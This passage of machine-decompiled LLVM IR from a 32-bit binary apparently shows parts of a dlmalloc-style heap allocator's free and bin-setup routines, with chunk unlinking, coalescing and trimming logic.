  store i32 %v5_804e628, i32* %eax.global-to-local, align 4
  %v3_804e62c = inttoptr i32 %v2_804e628 to i32*
  store i32 %v1_804e620, i32* %v3_804e62c, align 4
  %v0_804e62f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e62f = urem i32 %v0_804e62f, 2
  %v2_804e62f = icmp eq i32 %v1_804e62f, 0
  store i32 %v1_804e62f, i32* %eax.global-to-local, align 4
  %v1_804e634 = icmp eq i1 %v2_804e62f, false
  br i1 %v1_804e634, label %dec_label_pc_804e655, label %dec_label_pc_804e636

dec_label_pc_804e636:                             ; preds = %dec_label_pc_804e628
  %v0_804e636 = load i32, i32* @ebx, align 4
  %v1_804e636 = add i32 %v0_804e636, 8
  %v2_804e636 = inttoptr i32 %v1_804e636 to i32*
  %v3_804e636 = load i32, i32* %v2_804e636, align 4
  store i32 %v3_804e636, i32* @edx, align 4
  %v1_804e639 = add i32 %v0_804e636, 12
  %v2_804e639 = inttoptr i32 %v1_804e639 to i32*
  %v3_804e639 = load i32, i32* %v2_804e639, align 4
  store i32 %v3_804e639, i32* %eax.global-to-local, align 4
  %v1_804e63c = add i32 %v3_804e636, 12
  %v2_804e63c = inttoptr i32 %v1_804e63c to i32*
  %v3_804e63c = load i32, i32* %v2_804e63c, align 4
  store i32 %v3_804e63c, i32* @esi, align 4
  %v12_804e63f = icmp eq i32 %v3_804e63c, %v0_804e636
  %v1_804e641 = icmp eq i1 %v12_804e63f, false
  br i1 %v1_804e641, label %dec_label_pc_804e648, label %dec_label_pc_804e643

dec_label_pc_804e643:                             ; preds = %dec_label_pc_804e636
  %v1_804e643 = add i32 %v3_804e639, 8
  %v2_804e643 = inttoptr i32 %v1_804e643 to i32*
  %v3_804e643 = load i32, i32* %v2_804e643, align 4
  %v15_804e643 = icmp eq i32 %v3_804e643, %v3_804e63c
  br i1 %v15_804e643, label %dec_label_pc_804e64d, label %dec_label_pc_804e648

dec_label_pc_804e648:                             ; preds = %dec_label_pc_804e643, %dec_label_pc_804e636, %dec_label_pc_804e60b, %dec_label_pc_804e5f8
  %v0_804e648 = call i32 @function_804e8e4()
  store i32 %v0_804e648, i32* %eax.global-to-local, align 4
  %v1_804e64f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e64d

dec_label_pc_804e64d:                             ; preds = %dec_label_pc_804e643, %dec_label_pc_804e648
  %v1_804e64f = phi i32 [ %v3_804e636, %dec_label_pc_804e643 ], [ %v1_804e64f.pre, %dec_label_pc_804e648 ]
  %v0_804e64f = phi i32 [ %v3_804e639, %dec_label_pc_804e643 ], [ %v0_804e648, %dec_label_pc_804e648 ]
  %v0_804e64d = load i32, i32* @edi, align 4
  %v1_804e64d = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e64d = add i32 %v1_804e64d, %v0_804e64d
  store i32 %v2_804e64d, i32* @edi, align 4
  %v2_804e64f = add i32 %v1_804e64f, 12
  %v3_804e64f = inttoptr i32 %v2_804e64f to i32*
  store i32 %v0_804e64f, i32* %v3_804e64f, align 4
  %v0_804e652 = load i32, i32* @edx, align 4
  %v1_804e652 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e652 = add i32 %v1_804e652, 8
  %v3_804e652 = inttoptr i32 %v2_804e652 to i32*
  store i32 %v0_804e652, i32* %v3_804e652, align 4
  br label %dec_label_pc_804e655

dec_label_pc_804e655:                             ; preds = %dec_label_pc_804e628, %dec_label_pc_804e64d
  store i32 %v1_804e5a0, i32* %eax.global-to-local, align 4
  %v3_804e659 = load i32, i32* %v2_804e659, align 4
  store i32 %v3_804e659, i32* @edx, align 4
  %v0_804e65c = load i32, i32* @ecx, align 4
  store i32 %v0_804e65c, i32* %v2_804e659, align 4
  %v0_804e65f = load i32, i32* @edi, align 4
  %v1_804e661 = or i32 %v0_804e65f, 1
  store i32 %v1_804e661, i32* %eax.global-to-local, align 4
  %v0_804e664 = load i32, i32* @ecx, align 4
  %v1_804e664 = load i32, i32* @edx, align 4
  %v2_804e664 = add i32 %v1_804e664, 12
  %v3_804e664 = inttoptr i32 %v2_804e664 to i32*
  store i32 %v0_804e664, i32* %v3_804e664, align 4
  %v0_804e667 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e667 = load i32, i32* @ecx, align 4
  %v2_804e667 = add i32 %v1_804e667, 4
  %v3_804e667 = inttoptr i32 %v2_804e667 to i32*
  store i32 %v0_804e667, i32* %v3_804e667, align 4
  store i32 %v1_804e5a0, i32* %eax.global-to-local, align 4
  %v0_804e66e = load i32, i32* @edx, align 4
  %v1_804e66e = load i32, i32* @ecx, align 4
  %v2_804e66e = add i32 %v1_804e66e, 8
  %v3_804e66e = inttoptr i32 %v2_804e66e to i32*
  store i32 %v0_804e66e, i32* %v3_804e66e, align 4
  %v0_804e671 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e671 = load i32, i32* @ecx, align 4
  %v2_804e671 = add i32 %v1_804e671, 12
  %v3_804e671 = inttoptr i32 %v2_804e671 to i32*
  store i32 %v0_804e671, i32* %v3_804e671, align 4
  %v0_804e674 = load i32, i32* @edi, align 4
  %v1_804e674 = load i32, i32* @ecx, align 4
  %v3_804e674 = add i32 %v1_804e674, %v0_804e674
  %v4_804e674 = inttoptr i32 %v3_804e674 to i32*
  store i32 %v0_804e674, i32* %v4_804e674, align 4
  br label %dec_label_pc_804e689

dec_label_pc_804e679:                             ; preds = %dec_label_pc_804e618
  %v0_804e679 = load i32, i32* @edi, align 4
  %v2_804e679 = add i32 %v0_804e679, %v1_804e620
  %v1_804e67c = or i32 %v2_804e679, 1
  store i32 %v1_804e67c, i32* %eax.global-to-local, align 4
  %v1_804e67f = load i32, i32* @ecx, align 4
  %v2_804e67f = add i32 %v1_804e67f, 4
  %v3_804e67f = inttoptr i32 %v2_804e67f to i32*
  store i32 %v1_804e67c, i32* %v3_804e67f, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804e686 = load i32, i32* @ecx, align 4
  store i32 %v0_804e686, i32* %v3_804e686, align 4
  br label %dec_label_pc_804e689

dec_label_pc_804e689:                             ; preds = %dec_label_pc_804e655, %dec_label_pc_804e679
  store i32 %v3_804e5db, i32* @ecx, align 4
  %v1_804e68d = icmp eq i32 %v3_804e5db, 0
  %v1_804e68f = icmp eq i1 %v1_804e68d, false
  br i1 %v1_804e68f, label %dec_label_pc_804e5db, label %dec_label_pc_804e695

dec_label_pc_804e695:                             ; preds = %dec_label_pc_804e689, %dec_label_pc_804e5c7
  store i32 %v4_804e5bf, i32* @ecx, align 4
  %v15_804e699 = icmp eq i32 %v0_804e5d5, %v4_804e5bf
  br i1 %v15_804e699, label %dec_label_pc_804e71d, label %dec_label_pc_804e69f

dec_label_pc_804e69f:                             ; preds = %dec_label_pc_804e695
  %v4_804e69f = add i32 %v0_804e5d5, 4
  br label %dec_label_pc_804e5c7

dec_label_pc_804e6a9:                             ; preds = %dec_label_pc_804e6b8.preheader, %dec_label_pc_804e6a9
  %v1_804e6ad20 = phi i32 [ 1, %dec_label_pc_804e6b8.preheader ], [ %v0_804e6b8.pre, %dec_label_pc_804e6a9 ]
  %v2_804e6ad = mul i32 %v1_804e6ad20, 8
  %v4_804e6ad = add i32 %v3_804e6ad, %v2_804e6ad
  store i32 %v4_804e6ad, i32* %eax.global-to-local, align 4
  %v1_804e6b1 = add i32 %v1_804e6ad20, 1
  store i32 %v1_804e6b1, i32* %edx.global-to-local, align 4
  %v2_804e6b2 = add i32 %v4_804e6ad, 12
  %v3_804e6b2 = inttoptr i32 %v2_804e6b2 to i32*
  store i32 %v4_804e6ad, i32* %v3_804e6b2, align 4
  %v0_804e6b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e6b5 = add i32 %v0_804e6b5, 8
  %v3_804e6b5 = inttoptr i32 %v2_804e6b5 to i32*
  store i32 %v0_804e6b5, i32* %v3_804e6b5, align 4
  %v0_804e6b8.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804e6bb = icmp sgt i32 %v0_804e6b8.pre, 95
  br i1 %v7_804e6bb, label %dec_label_pc_804e6bd, label %dec_label_pc_804e6a9

dec_label_pc_804e6bd:                             ; preds = %dec_label_pc_804e6a9
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804e6c1 = add i32 %tmp11, 864
  %v2_804e6c1 = inttoptr i32 %v1_804e6c1 to i32*
  %v3_804e6c1 = load i32, i32* %v2_804e6c1, align 4
  %v4_804e6c1 = or i32 %v3_804e6c1, 1
  store i32 %v4_804e6c1, i32* %v2_804e6c1, align 4
  %v0_804e6c8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6c8 = add i32 %v0_804e6c8, 840
  %v2_804e6c8 = inttoptr i32 %v1_804e6c8 to i32*
  store i32 0, i32* %v2_804e6c8, align 4
  %v0_804e6d2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6d2 = add i32 %v0_804e6d2, 852
  %v2_804e6d2 = inttoptr i32 %v1_804e6d2 to i32*
  store i32 65536, i32* %v2_804e6d2, align 4
  %v0_804e6dc = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6dc = add i32 %v0_804e6dc, 844
  %v2_804e6dc = inttoptr i32 %v1_804e6dc to i32*
  store i32 262144, i32* %v2_804e6dc, align 4
  %v0_804e6e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6e6 = add i32 %v0_804e6e6, 836
  %v2_804e6e6 = inttoptr i32 %v1_804e6e6 to i32*
  store i32 262144, i32* %v2_804e6e6, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804e6f7 = load i32, i32* %arg1, align 4
  %v1_804e6f9 = urem i32 %v2_804e6f7, 4
  %v1_804e6fc = or i32 %v1_804e6f9, 72
  store i32 %v1_804e6fc, i32* %arg1, align 4
  %v0_804e701 = load i32, i32* @edx, align 4
  %v1_804e703 = add i32 %v0_804e701, 52
  store i32 %v1_804e703, i32* %eax.global-to-local, align 4
  %v2_804e706 = add i32 %v0_804e701, 44
  %v3_804e706 = inttoptr i32 %v2_804e706 to i32*
  store i32 %v1_804e703, i32* %v3_804e706, align 4
  %v1_804e70b = call i32 @function_804f124(i32 30)
  store i32 %v1_804e70b, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804e717 = add i32 %tmp11, 860
  %v3_804e717 = inttoptr i32 %v2_804e717 to i32*
  store i32 %v1_804e70b, i32* %v3_804e717, align 4
  br label %dec_label_pc_804e71d

dec_label_pc_804e71d:                             ; preds = %dec_label_pc_804e695, %dec_label_pc_804e6bd
  store i32 %v0_804e580, i32* @ebx, align 4
  store i32 %v0_804e57f, i32* @esi, align 4
  store i32 %v0_804e57e, i32* @edi, align 4
  %v0_804e724 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804e724

; uselistorder directives
  uselistorder i32 %v0_804e6b5, { 1, 0 }
  uselistorder i32 %v0_804e674, { 1, 0 }
  uselistorder i32 %v1_804e62f, { 1, 0 }
  uselistorder i32 %v2_804e628, { 1, 0 }
  uselistorder i32 %v1_804e620, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e62c, { 1, 0 }
  uselistorder i32 %v3_804e5db, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804e5f8, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804e5d5, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804e686, { 1, 0 }
  uselistorder i32 %v1_804e5a0, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804e71d, { 1, 0 }
  uselistorder label %dec_label_pc_804e6a9, { 1, 0 }
  uselistorder label %dec_label_pc_804e689, { 1, 0 }
  uselistorder label %dec_label_pc_804e655, { 1, 0 }
  uselistorder label %dec_label_pc_804e64d, { 1, 0 }
  uselistorder label %dec_label_pc_804e618, { 1, 0 }
}

define i32 @function_804e725(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e725:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804e725 = load i32, i32* @ebp, align 4
  %v0_804e726 = load i32, i32* @edi, align 4
  %v0_804e727 = load i32, i32* @esi, align 4
  %v0_804e728 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804e730 = icmp eq i32 %arg1, 0
  br i1 %v1_804e730, label %dec_label_pc_804e8b9, label %dec_label_pc_804e738

dec_label_pc_804e738:                             ; preds = %dec_label_pc_804e725
  %v2_804e743 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e743, i32* @eax, align 4
  %v2_804e748 = call i32 @function_804f2ae(i32 %v2_804e743, i32 134541995)
  store i32 %v2_804e748, i32* %eax.global-to-local, align 4
  %v1_804e754 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055f70.140 to i32))
  %v1_804e759 = add i32 %arg1, -8
  store i32 %v1_804e759, i32* @ecx, align 4
  %v0_804e75c = load i8, i8* @global_var_80589e0.141, align 1
  %v1_804e75c = sext i8 %v0_804e75c to i32
  store i32 %v1_804e75c, i32* %eax.global-to-local, align 4
  %v1_804e764 = add i32 %arg1, -4
  %v2_804e764 = inttoptr i32 %v1_804e764 to i32*
  %v3_804e764 = load i32, i32* %v2_804e764, align 4
  %v1_804e769 = and i32 %v3_804e764, -4
  %v4_804e769 = trunc i32 %v1_804e769 to i8
  store i32 %v1_804e769, i32* @ebx, align 4
  %v8_804e76e = icmp ugt i8 %v4_804e769, %v0_804e75c
  br i1 %v8_804e76e, label %dec_label_pc_804e790, label %dec_label_pc_804e770

dec_label_pc_804e770:                             ; preds = %dec_label_pc_804e738
  %v2_804e770 = udiv i32 %v3_804e764, 8
  %v1_804e773 = or i32 %v1_804e75c, 3
  %v3_804e773 = trunc i32 %v1_804e773 to i8
  store i32 %v1_804e773, i32* %eax.global-to-local, align 4
  store i8 %v3_804e773, i8* @global_var_80589e0.141, align 32
  %v1_804e77b = mul nuw i32 %v2_804e770, 4
  %v2_804e77b = add i32 %v1_804e77b, ptrtoint (i8* @global_var_80589e0.141 to i32)
  store i32 %v2_804e77b, i32* @edx, align 4
  %v1_804e782 = add i32 %v1_804e77b, add (i32 ptrtoint (i8* @global_var_80589e0.141 to i32), i32 -4)
  %v2_804e782 = inttoptr i32 %v1_804e782 to i32*
  %v3_804e782 = load i32, i32* %v2_804e782, align 4
  store i32 %v3_804e782, i32* %eax.global-to-local, align 4
  %v3_804e785 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804e782, i32* %v3_804e785, align 4
  %v0_804e788 = load i32, i32* @ecx, align 4
  %v1_804e788 = load i32, i32* @edx, align 4
  %v2_804e788 = add i32 %v1_804e788, -4
  %v3_804e788 = inttoptr i32 %v2_804e788 to i32*
  store i32 %v0_804e788, i32* %v3_804e788, align 4
  br label %dec_label_pc_804e8a8

dec_label_pc_804e790:                             ; preds = %dec_label_pc_804e738
  %v1_804e790 = trunc i32 %v3_804e764 to i8
  %v2_804e790 = and i8 %v1_804e790, 2
  %v3_804e790 = icmp eq i8 %v2_804e790, 0
  %v5_804e790 = zext i8 %v2_804e790 to i32
  %v7_804e790 = and i32 %v3_804e764, -256
  %v8_804e790 = or i32 %v5_804e790, %v7_804e790
  store i32 %v8_804e790, i32* @edx, align 4
  %v1_804e793 = icmp eq i1 %v3_804e790, false
  br i1 %v1_804e793, label %dec_label_pc_804e888, label %dec_label_pc_804e799

dec_label_pc_804e799:                             ; preds = %dec_label_pc_804e790
  %v1_804e799 = or i32 %v1_804e75c, 1
  %v3_804e799 = trunc i32 %v1_804e799 to i8
  store i32 %v1_804e799, i32* %eax.global-to-local, align 4
  %v2_804e79c = add i32 %v1_804e769, %v1_804e759
  store i32 %v2_804e79c, i32* @esi, align 4
  store i8 %v3_804e799, i8* @global_var_80589e0.141, align 32
  %v1_804e7a4 = add i32 %v2_804e79c, 4
  %v2_804e7a4 = inttoptr i32 %v1_804e7a4 to i32*
  %v3_804e7a4 = load i32, i32* %v2_804e7a4, align 4
  store i32 %v3_804e7a4, i32* %eax.global-to-local, align 4
  %v2_804e7ab = inttoptr i32 %v1_804e764 to i8*
  %v3_804e7ab = load i8, i8* %v2_804e7ab, align 1
  %v4_804e7ab = urem i8 %v3_804e7ab, 2
  %v5_804e7ab = icmp eq i8 %v4_804e7ab, 0
  %v1_804e7af = icmp eq i1 %v5_804e7ab, false
  br i1 %v1_804e7af, label %dec_label_pc_804e7d2, label %dec_label_pc_804e7b1

dec_label_pc_804e7b1:                             ; preds = %dec_label_pc_804e799
  %v2_804e7b1 = inttoptr i32 %v1_804e759 to i32*
  %v3_804e7b1 = load i32, i32* %v2_804e7b1, align 4
  store i32 %v3_804e7b1, i32* @ebp, align 4
  %v2_804e7b6 = sub i32 %v1_804e759, %v3_804e7b1
  store i32 %v2_804e7b6, i32* %eax.global-to-local, align 4
  %v1_804e7b8 = add i32 %v2_804e7b6, 8
  %v2_804e7b8 = inttoptr i32 %v1_804e7b8 to i32*
  %v3_804e7b8 = load i32, i32* %v2_804e7b8, align 4
  store i32 %v3_804e7b8, i32* @edi, align 4
  %v1_804e7bb = add i32 %v2_804e7b6, 12
  %v2_804e7bb = inttoptr i32 %v1_804e7bb to i32*
  %v3_804e7bb = load i32, i32* %v2_804e7bb, align 4
  store i32 %v3_804e7bb, i32* @edx, align 4
  %v1_804e7be = add i32 %v3_804e7b8, 12
  %v2_804e7be = inttoptr i32 %v1_804e7be to i32*
  %v3_804e7be = load i32, i32* %v2_804e7be, align 4
  store i32 %v3_804e7be, i32* @ecx, align 4
  %v12_804e7c1 = icmp eq i32 %v3_804e7be, %v2_804e7b6
  %v1_804e7c3 = icmp eq i1 %v12_804e7c1, false
  br i1 %v1_804e7c3, label %dec_label_pc_804e801, label %dec_label_pc_804e7c5

dec_label_pc_804e7c5:                             ; preds = %dec_label_pc_804e7b1
  %v1_804e7c5 = add i32 %v3_804e7bb, 8
  %v2_804e7c5 = inttoptr i32 %v1_804e7c5 to i32*
  %v3_804e7c5 = load i32, i32* %v2_804e7c5, align 4
  %v15_804e7c5 = icmp eq i32 %v3_804e7c5, %v3_804e7be
  %v1_804e7c8 = icmp eq i1 %v15_804e7c5, false
  br i1 %v1_804e7c8, label %dec_label_pc_804e801, label %dec_label_pc_804e7ca

dec_label_pc_804e7ca:                             ; preds = %dec_label_pc_804e7c5
  %v2_804e7ca = add i32 %v3_804e7b1, %v1_804e769
  store i32 %v2_804e7ca, i32* @ebx, align 4
  store i32 %v3_804e7bb, i32* %v2_804e7be, align 4
  %v0_804e7cf = load i32, i32* @edi, align 4
  %v1_804e7cf = load i32, i32* @edx, align 4
  %v2_804e7cf = add i32 %v1_804e7cf, 8
  %v3_804e7cf = inttoptr i32 %v2_804e7cf to i32*
  store i32 %v0_804e7cf, i32* %v3_804e7cf, align 4
  %v0_804e7d9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e7d2

dec_label_pc_804e7d2:                             ; preds = %dec_label_pc_804e799, %dec_label_pc_804e7ca
  %v1_804e7e5 = phi i32 [ %v2_804e79c, %dec_label_pc_804e799 ], [ %v0_804e7d9.pre, %dec_label_pc_804e7ca ]
  %v1_804e7d6 = and i32 %v3_804e7a4, -4
  store i32 %v1_804e7d6, i32* @ebp, align 4
  %v1_804e7d9 = load i32, i32* @global_var_8058a0c.142, align 4
  %v12_804e7d9 = icmp eq i32 %v1_804e7e5, %v1_804e7d9
  br i1 %v12_804e7d9, label %dec_label_pc_804e833, label %dec_label_pc_804e7e1

dec_label_pc_804e7e1:                             ; preds = %dec_label_pc_804e7d2
  %v2_804e7e1 = add i32 %v1_804e7e5, 4
  %v3_804e7e1 = add i32 %v2_804e7e1, %v1_804e7d6
  %v4_804e7e1 = inttoptr i32 %v3_804e7e1 to i32*
  %v5_804e7e1 = load i32, i32* %v4_804e7e1, align 4
  store i32 %v5_804e7e1, i32* %eax.global-to-local, align 4
  %v3_804e7e5 = inttoptr i32 %v2_804e7e1 to i32*
  store i32 %v1_804e7d6, i32* %v3_804e7e5, align 4
  %v0_804e7e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7e8 = urem i32 %v0_804e7e8, 2
  %v2_804e7e8 = icmp eq i32 %v1_804e7e8, 0
  store i32 %v1_804e7e8, i32* %eax.global-to-local, align 4
  %v1_804e7ed = icmp eq i1 %v2_804e7e8, false
  br i1 %v1_804e7ed, label %dec_label_pc_804e80e, label %dec_label_pc_804e7ef

dec_label_pc_804e7ef:                             ; preds = %dec_label_pc_804e7e1
  %v0_804e7ef = load i32, i32* @esi, align 4
  %v1_804e7ef = add i32 %v0_804e7ef, 8
  %v2_804e7ef = inttoptr i32 %v1_804e7ef to i32*
  %v3_804e7ef = load i32, i32* %v2_804e7ef, align 4
  store i32 %v3_804e7ef, i32* @edx, align 4
  %v1_804e7f2 = add i32 %v0_804e7ef, 12
  %v2_804e7f2 = inttoptr i32 %v1_804e7f2 to i32*
  %v3_804e7f2 = load i32, i32* %v2_804e7f2, align 4
  store i32 %v3_804e7f2, i32* %eax.global-to-local, align 4
  %v1_804e7f5 = add i32 %v3_804e7ef, 12
  %v2_804e7f5 = inttoptr i32 %v1_804e7f5 to i32*
  %v3_804e7f5 = load i32, i32* %v2_804e7f5, align 4
  store i32 %v3_804e7f5, i32* @edi, align 4
  %v12_804e7f8 = icmp eq i32 %v3_804e7f5, %v0_804e7ef
  %v1_804e7fa = icmp eq i1 %v12_804e7f8, false
  br i1 %v1_804e7fa, label %dec_label_pc_804e801, label %dec_label_pc_804e7fc

dec_label_pc_804e7fc:                             ; preds = %dec_label_pc_804e7ef
  %v1_804e7fc = add i32 %v3_804e7f2, 8
  %v2_804e7fc = inttoptr i32 %v1_804e7fc to i32*
  %v3_804e7fc = load i32, i32* %v2_804e7fc, align 4
  %v15_804e7fc = icmp eq i32 %v3_804e7fc, %v3_804e7f5
  br i1 %v15_804e7fc, label %dec_label_pc_804e806, label %dec_label_pc_804e801

dec_label_pc_804e801:                             ; preds = %dec_label_pc_804e7fc, %dec_label_pc_804e7ef, %dec_label_pc_804e7c5, %dec_label_pc_804e7b1
  %v0_804e801 = call i32 @function_804e8e4()
  store i32 %v0_804e801, i32* %eax.global-to-local, align 4
  %v1_804e806.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e806

dec_label_pc_804e806:                             ; preds = %dec_label_pc_804e7fc, %dec_label_pc_804e801
  %v1_804e806 = phi i32 [ %v3_804e7ef, %dec_label_pc_804e7fc ], [ %v1_804e806.pre, %dec_label_pc_804e801 ]
  %v0_804e806 = phi i32 [ %v3_804e7f2, %dec_label_pc_804e7fc ], [ %v0_804e801, %dec_label_pc_804e801 ]
  %v2_804e806 = add i32 %v1_804e806, 12
  %v3_804e806 = inttoptr i32 %v2_804e806 to i32*
  store i32 %v0_804e806, i32* %v3_804e806, align 4
  %v0_804e809 = load i32, i32* @edx, align 4
  %v1_804e809 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e809 = add i32 %v1_804e809, 8
  %v3_804e809 = inttoptr i32 %v2_804e809 to i32*
  store i32 %v0_804e809, i32* %v3_804e809, align 4
  %v0_804e80c = load i32, i32* @ebx, align 4
  %v1_804e80c = load i32, i32* @ebp, align 4
  %v2_804e80c = add i32 %v1_804e80c, %v0_804e80c
  store i32 %v2_804e80c, i32* @ebx, align 4
  br label %dec_label_pc_804e80e

dec_label_pc_804e80e:                             ; preds = %dec_label_pc_804e7e1, %dec_label_pc_804e806
  %v0_804e80e = load i32, i32* @global_var_8058a1c.160, align 4
  store i32 %v0_804e80e, i32* %eax.global-to-local, align 4
  %v0_804e813 = load i32, i32* @ecx, align 4
  %v1_804e813 = add i32 %v0_804e813, 12
  %v2_804e813 = inttoptr i32 %v1_804e813 to i32*
  store i32 ptrtoint (i32* @global_var_8058a14.144 to i32), i32* %v2_804e813, align 4
  %v0_804e81a = load i32, i32* %eax.global-to-local, align 4
  %v1_804e81a = load i32, i32* @ecx, align 4
  %v2_804e81a = add i32 %v1_804e81a, 8
  %v3_804e81a = inttoptr i32 %v2_804e81a to i32*
  store i32 %v0_804e81a, i32* %v3_804e81a, align 4
  %v0_804e81d = load i32, i32* @ebx, align 4
  %v1_804e81d = load i32, i32* @ecx, align 4
  %v3_804e81d = add i32 %v1_804e81d, %v0_804e81d
  %v4_804e81d = inttoptr i32 %v3_804e81d to i32*
  store i32 %v0_804e81d, i32* %v4_804e81d, align 4
  %v0_804e820 = load i32, i32* @ecx, align 4
  %v1_804e820 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e820 = add i32 %v1_804e820, 12
  %v3_804e820 = inttoptr i32 %v2_804e820 to i32*
  store i32 %v0_804e820, i32* %v3_804e820, align 4
  %v0_804e823 = load i32, i32* @ebx, align 4
  %v1_804e825 = or i32 %v0_804e823, 1
  store i32 %v1_804e825, i32* %eax.global-to-local, align 4
  %v0_804e828 = load i32, i32* @ecx, align 4
  store i32 %v0_804e828, i32* @global_var_8058a1c.160, align 4
  %v2_804e82e = add i32 %v0_804e828, 4
  %v3_804e82e = inttoptr i32 %v2_804e82e to i32*
  store i32 %v1_804e825, i32* %v3_804e82e, align 4
  br label %dec_label_pc_804e843

dec_label_pc_804e833:                             ; preds = %dec_label_pc_804e7d2
  %v0_804e833 = load i32, i32* @ebx, align 4
  %v2_804e833 = add i32 %v0_804e833, %v1_804e7d6
  store i32 %v2_804e833, i32* @ebx, align 4
  %v1_804e837 = or i32 %v2_804e833, 1
  store i32 %v1_804e837, i32* %eax.global-to-local, align 4
  %v1_804e83a = load i32, i32* @ecx, align 4
  %v2_804e83a = add i32 %v1_804e83a, 4
  %v3_804e83a = inttoptr i32 %v2_804e83a to i32*
  store i32 %v1_804e837, i32* %v3_804e83a, align 4
  %v0_804e83d = load i32, i32* @ecx, align 4
  store i32 %v0_804e83d, i32* @global_var_8058a0c.142, align 4
  br label %dec_label_pc_804e843

dec_label_pc_804e843:                             ; preds = %dec_label_pc_804e80e, %dec_label_pc_804e833
  %v0_804e843 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_804e843, 131072
  br i1 %tmp21, label %dec_label_pc_804e8a8, label %dec_label_pc_804e84b

dec_label_pc_804e84b:                             ; preds = %dec_label_pc_804e843
  %v0_804e84b = load i8, i8* @global_var_80589e0.141, align 32
  %v1_804e84b = and i8 %v0_804e84b, 2
  %v2_804e84b = icmp eq i8 %v1_804e84b, 0
  br i1 %v2_804e84b, label %dec_label_pc_804e864, label %dec_label_pc_804e854

dec_label_pc_804e854:                             ; preds = %dec_label_pc_804e84b
  %v2_804e85c = call i32 @function_804e57d(i32* bitcast (i8* @global_var_80589e0.141 to i32*))
  store i32 %v2_804e85c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e864

dec_label_pc_804e864:                             ; preds = %dec_label_pc_804e84b, %dec_label_pc_804e854
  %v0_804e864 = load i32, i32* @global_var_8058a0c.142, align 4
  store i32 %v0_804e864, i32* %eax.global-to-local, align 4
  %v1_804e869 = add i32 %v0_804e864, 4
  %v2_804e869 = inttoptr i32 %v1_804e869 to i32*
  %v3_804e869 = load i32, i32* %v2_804e869, align 4
  %v1_804e86c = and i32 %v3_804e869, -4
  store i32 %v1_804e86c, i32* %eax.global-to-local, align 4
  %v1_804e86f = load i32, i32* @global_var_8058d24.158, align 4
  %v7_804e86f = icmp ult i32 %v1_804e86c, %v1_804e86f
  br i1 %v7_804e86f, label %dec_label_pc_804e8a8, label %dec_label_pc_804e877

dec_label_pc_804e877:                             ; preds = %dec_label_pc_804e864
  store i32 ptrtoint (i8* @global_var_80589e0.141 to i32), i32* @edx, align 4
  %v0_804e87c = load i32, i32* @global_var_8058d28.156, align 8
  store i32 %v0_804e87c, i32* @eax, align 4
  %v0_804e881 = call i32 @function_804e4f0()
  store i32 %v0_804e881, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8a8

dec_label_pc_804e888:                             ; preds = %dec_label_pc_804e790
  %v2_804e888 = inttoptr i32 %v1_804e759 to i32*
  %v3_804e888 = load i32, i32* %v2_804e888, align 4
  %v0_804e88b = load i32, i32* @global_var_8058d30.149, align 16
  %v1_804e88b = add i32 %v0_804e88b, -1
  store i32 %v1_804e88b, i32* @global_var_8058d30.149, align 16
  %v2_804e891 = add i32 %v3_804e888, %v1_804e769
  store i32 %v2_804e891, i32* %eax.global-to-local, align 4
  %v2_804e894 = sub i32 %v1_804e759, %v3_804e888
  %v0_804e89a = load i32, i32* @global_var_8058d44.152, align 4
  %v2_804e89a = sub i32 %v0_804e89a, %v2_804e891
  store i32 %v2_804e89a, i32* @global_var_8058d44.152, align 4
  %v4_804e8a0 = inttoptr i32 %v2_804e894 to i32*
  %v5_804e8a0 = call i32 @function_804f904(i32* %v4_804e8a0, i32 %v2_804e891, i32 %v1_804e769, i32 %v1_804e769)
  store i32 %v5_804e8a0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8a8

dec_label_pc_804e8a8:                             ; preds = %dec_label_pc_804e864, %dec_label_pc_804e843, %dec_label_pc_804e877, %dec_label_pc_804e770, %dec_label_pc_804e888
  store i32 %v2_804e743, i32* @eax, align 4
  %v2_804e8b1 = call i32 @function_804f2ae(i32 %v2_804e743, i32 1)
  store i32 %v2_804e8b1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8b9

